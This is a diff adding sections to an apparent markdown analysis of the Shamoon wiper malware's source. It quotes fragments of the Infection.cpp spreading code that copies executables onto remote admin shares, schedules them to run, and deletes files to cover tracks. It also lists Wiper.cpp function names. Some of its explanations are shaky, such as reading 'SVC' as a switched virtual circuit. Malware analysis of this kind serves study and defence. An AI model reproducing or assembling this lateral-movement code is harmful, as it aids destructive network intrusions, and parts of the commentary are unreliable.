@@ -95,3 +95,95 @@ Whereas 64bit has only
 ```
 bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
 ```
+
+
+## Handler.cpp
+
+
+## Infection.cpp
+
+The bread and butter of the code; as the name would have it, Infection.cpp is responsible for the spreading of the malware that resulted
+in tens of thousands of computers in the Middle East to be infected. Such another large scale attack is what is feared by many as Iranian hackers begin to lay the groundwork for another attack (as seen in the rise of phishing attacks)
+
+The functions in this module:
+```
+bool WriteModuleOnSharedPC(LPCWSTR a1, LPCWSTR a2)
+
+bool WriteModuleOnSharedNetwork()
+
+bool WriteModuleOnSharedPCByArgv()
+```
+
+The first function is responsible for the infection of the current PC. The first step is acquiring the remote prefix (of the form "\\x.x.x.x\" 
+```
+M_STRING03
+	(
+		szRemotePrefix,
+
+		L"\\\\",
+		szRemoteAddr,
+		L"\\"
+	)
+```
+which is then used by string concatenation techniques to acquire a full pathname that will then allow for command execution. The format of the desired string is mentioned in comments.
+```
+while(1)
+	{
+		// Final format will be something like: "\\x.x.x.x\C$\\WINDOWS\\system32\\csrss.exe"
+		memmove(&szSvcCSRSS[nPrefLen], pPart, strlenW(pPart) * sizeof(WCHAR));
+		memmove(&szSvcCSRSS[nPrefLen + strlenW(pPart)], L"\\system32\\csrss.exe", strlenW(L"\\system32\\csrss.exe") * 
+			sizeof(WCHAR));
+		szSvcCSRSS[nPrefLen + strlenW(pPart) + strlenW(L"\\system32\\csrss.exe")] = 0;
+
+		if(IsFileAccessible(szSvcCSRSS))
+			break;
+```
+where the memmove function "is used to copy a block of memory from a location to another" (https://www.geeksforgeeks.org/memmove-in-cc/).
+> void *memmove(void *str1, const void *str2, size_t n)
+
+After the proper file path has been obtained, the code proceeds to apparently copy the malicious files and 'add a new job'.
+The first part of the code searches for a random SVC (switched virtual circuit) that would allow for a connection that lasts long enough for data transfer
+```
+v17 = g_random_svc_name[GetRandom() % 29]
+```
+After, strcpyW is employed
+> PWSTR StrCpyW(PWSTR  psz1, PCWSTR psz2)
+where psz1 receives a copy of psz2. The functions used are probably wrappers, explaining the third paramter, which is the
+size of the string (https://stackoverflow.com/questions/34889219/strcpy-with-3-parameters-reference-shows-only-2)
+
+```
+strcpyW(v46, v17, 2 * strlenW(v17));
+strcpyW(&v46[strlenW(v17)], L".exe", 2 * strlenW(L".exe") + 2);
+strcpyW(&szRemotePrefix[v33], v46, 2 * strlenW(v46) + 2);
+```
+The first parameters appear to be pointers in the remote system (target), while the second parameters (the thing being copied into paramter 1) are the infectious files, as indicated by the ".exe" extension in the second strcpy.
+
+More strcpyWs are employed, with the intention to copy straight into the root directory:
+```
+strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
+strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], v46, 2 * strlenW(v46) + 2);
+```
+The next lines appear to set up the execution of the malicious code on the remote system as seen by 'AddNewJob' on what appears
+to be a remote address
+```	
+if(AddNewJob(szRemoteAddr, v40))
+	return true;
+	
+AddNewJob(szRemoteAddr, v46);
+```
+The next few strcpyWs appear to copy an executable "trksvr.exe" onto the remote system, and then a file is deleted (?)
+An explanation for this may be to cover tracks and have the malware remove itself after infecting the target.
+```
+strcpyW(NewFileName, v42, 2 * strlenW(v42));
+strcpyW(&NewFileName[strlenW(v42)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
+strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
+DeleteFileW(NewFileName);
+```
+## Wiper.cpp
+
+The wiper file contains the functions
+```
+void Shamoon::Modules::Wiper::DeleteWiperModules()
+
+bool Shamoon::Modules::Wiper::GetWiperSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
+```
